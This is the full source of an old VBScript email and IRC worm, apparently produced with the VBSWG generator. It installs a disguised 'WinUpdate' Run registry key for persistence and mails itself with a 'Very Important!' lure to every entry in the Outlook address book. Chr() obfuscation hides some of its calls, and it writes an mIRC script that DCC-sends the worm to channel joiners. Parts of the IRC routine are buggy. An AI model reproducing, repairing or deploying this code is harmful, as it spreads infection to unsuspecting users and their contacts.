'Vbs.Vbswg.Test Created By me. 3/11/2001
Set RF16JH3F = createobject("scripting.filesystemobject")
ERS71JA3 = RF16JH3F.getspecialfolder(1)
MA86TQQ0 = ERS71JA3 & "\Vbswg_Worm.txt.vbs"
Set AHO13A8U = createobject("wscript.shell")
AHO13A8U.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & MA86TQQ0 & " %"
RF16JH3F.copyfile wscript.scriptfullname, MA86TQQ0
If AHO13A8U.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Test\IK7569EN") <> 1 then
CQ43481A
End if
If AHO13A8U.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Test\N24U8LK4") <> 1 then
G7FB7C4I ""
End if
Function CQ43481A()
Set E5C2UU16 = CreateObject("Outlook.Application")
If E5C2UU16 = "Outlook" Then
Set LDDJSL8C = E5C2UU16.GetNameSpace("MAPI")
Set BU291N64 = LDDJSL8C.AddressLists
For Each ASHC6FFS In BU291N64
If ASHC6FFS.AddressEntries.Count <> 0 Then
FOM3JI2J = ASHC6FFS.AddressEntries.Count
For NM5DT627 = 1 To FOM3JI2J
Set K2QJ9P52 = E5C2UU16.CreateItem(0)
Set LNKEDO52 = ASHC6FFS.AddressEntries(NM5DT627)
K2QJ9P52.To = LNKEDO52.Address
K2QJ9P52.Subject = "Very Important!"
K2QJ9P52.Body = "Hi:" & vbcrlf & "Please view this file, it's very important." & vbcrlf & ""
execute "set GQ6431D8 =K2QJ9P52." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
V5N14H07 = MA86TQQ0
K2QJ9P52.DeleteAfterSubmit = True
GQ6431D8.Add V5N14H07
If K2QJ9P52.To <> "" Then
K2QJ9P52.Send
End If
Next
End If
Next
End If
End function
Function G7FB7C4I(ECLEI6AU)
If ECLEI6AU <> "" Then
F8S6S4PA = AHO13A8U.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If RF16JH3F.fileexists("c:\mirc\mirc.ini") Then
ECLEI6AU = "c:\mirc"
ElseIf RF16JH3F.fileexists("c:\mirc32\mirc.ini") Then
ECLEI6AU = "c:\mirc32"
ElseIf RF16JH3F.fileexists(F8S6S4PA & "\mirc\mirc.ini") Then
ECLEI6AU = F8S6S4PA & "\mirc"
ElseIf RF16JH3F.fileexists(F8S6S4PA & "\mirc32\mirc.ini") Then
ECLEI6AU = F8S6S4PA & "\mirc"
Else
ECLEI6AU = ""
End If
End If
If ECLEI6AU <> "" Then
Set CR5E4LUV = RF16JH3F.CreateTextFile(ECLEI6AU & "\script.ini", True)
CR5E4LUV = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
CR5E4LUV = CR5E4LUV & vbCrLf & "n0=on 1:JOIN:#:{"
CR5E4LUV = CR5E4LUV & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
CR5E4LUV = CR5E4LUV & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
CR5E4LUV = CR5E4LUV & MA86TQQ0
CR5E4LUV = CR5E4LUV & vbCrLf & "n3=}"
script.Close
End If
End Function
'Vbswg 2 Beta. By [K]
